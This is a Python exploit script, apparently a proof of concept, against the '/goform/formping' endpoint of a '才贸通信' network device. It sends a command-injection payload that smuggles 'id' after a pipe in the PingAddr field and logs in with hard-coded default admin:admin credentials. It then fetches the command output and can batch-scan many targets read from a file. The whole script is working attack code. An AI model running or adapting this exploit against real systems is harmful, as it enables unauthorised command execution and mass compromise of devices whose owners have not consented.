#!/usr/bin/env python
# -*- conding:utf-8 -*-
# 才贸通信 formping 命令执行

import requests
import argparse
import sys
import urllib3
import time

urllib3.disable_warnings()


def title():
    print("""
  __                                 _               
 / _|                               (_)              
| |_   ___   _ __  _ __ ___   _ __   _  _ __    __ _ 
|  _| / _ \ | '__|| '_ ` _ \ | '_ \ | || '_ \  / _` |
| |  | (_) || |   | | | | | || |_) || || | | || (_| |
|_|   \___/ |_|   |_| |_| |_|| .__/ |_||_| |_| \__, |
                             | |                __/ |
                             |_|               |___/ 


                                                 Author:Henry4E36
               """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        payload = self.url + "/goform/formping"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Authorization": "Basic YWRtaW46YWRtaW4="
        }
        data ="PingAddr=www.baidu.com%7Cid&PingPackNumb=1&PingMsg="

        try:
            res = requests.post(url=payload, headers=headers, data=data, verify=False, timeout=5)

            if res.status_code == 200 and "Start" in res.text:
                print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在命令执行！\033[0m")
                print(f"\033[31m[{chr(8730)}] 正在获取结果！\033[0m")
                time.sleep(3)
                result = requests.get(url=self.url + "/pingmessages",headers=headers, verify=False, timeout=5).text
                print(result)
                print("[" + "-" * 100 + "]")
            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在命令执行！")
                print("[" + "-" * 100 + "]")
        except Exception as e:
            print("[\033[31mX\033[0m]  连接错误！")
            print("[" + "-" * 100 + "]")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='才贸通信 formping 命令执行')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 formping.py -u http://127.0.0.1\neg2:>>>python3 formping.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()